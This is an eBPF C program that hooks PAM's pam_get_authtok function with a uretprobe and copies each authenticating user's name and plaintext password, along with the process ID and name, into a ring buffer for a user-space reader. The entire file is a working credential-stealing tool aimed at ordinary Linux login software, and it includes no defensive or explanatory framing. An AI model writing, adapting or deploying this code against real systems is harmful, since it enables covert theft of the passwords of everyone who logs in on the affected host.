// +build ignore

#include "common.h"

#include "bpf_tracing.h"
char __license[] SEC("license") = "Dual MIT/GPL";

struct pam_handle
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt; /* for use by pam_get_user() */
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type; /* PAM_AUTHTOK_TYPE */
  void *data;
  void *env; /* structure to maintain environment list */
} ;

struct event_t {
    int  pid;           // pid of the process
    u8 comm[16];      // name of the process
    u8 username[80];
    u8 password[80];  // secrets
} ;

struct
{
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

const struct event_t *unused __attribute__((unused));


SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx)){
    return 0;
  }
   

  struct pam_handle* phandle = (void *)PT_REGS_PARM1(ctx);
  // Get current PID to track
  u32 pid = bpf_get_current_pid_tgid() >> 32;

  // retrieve output parameter
  u64 password_addr = 0;
  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
  
  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  struct event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }
  return 0;
};
